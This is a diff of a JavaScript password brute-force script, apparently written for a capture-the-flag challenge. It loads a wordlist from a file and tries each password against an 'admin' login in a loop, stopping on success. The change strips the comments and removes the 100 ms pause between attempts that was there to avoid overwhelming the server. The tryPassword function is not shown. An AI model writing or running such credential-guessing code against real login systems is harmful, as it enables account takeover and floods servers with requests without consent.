@@ -31,7 +31,6 @@ async function tryPassword(username, password) {
 
 async function bruteForceLogin(passwordFile, username = 'admin') {
     try {
-        // Read passwords from file
         const passwords = fs.readFileSync(passwordFile, 'utf8')
                            .split('\n')
                            .map(p => p.trim())
@@ -39,14 +38,11 @@ async function bruteForceLogin(passwordFile, username = 'admin') {
 
         console.log(`Loaded ${passwords.length} passwords`);
 
-        // Test each password sequentially
         for (const password of passwords) {
             const success = await tryPassword(username, password);
             if (success) {
-                break; // Stop if we found the flag
+                break;
             }
-            // Optional: Add delay to avoid overwhelming server
-            await new Promise(resolve => setTimeout(resolve, 100));
         }
         
         console.log('Brute force attempt completed');
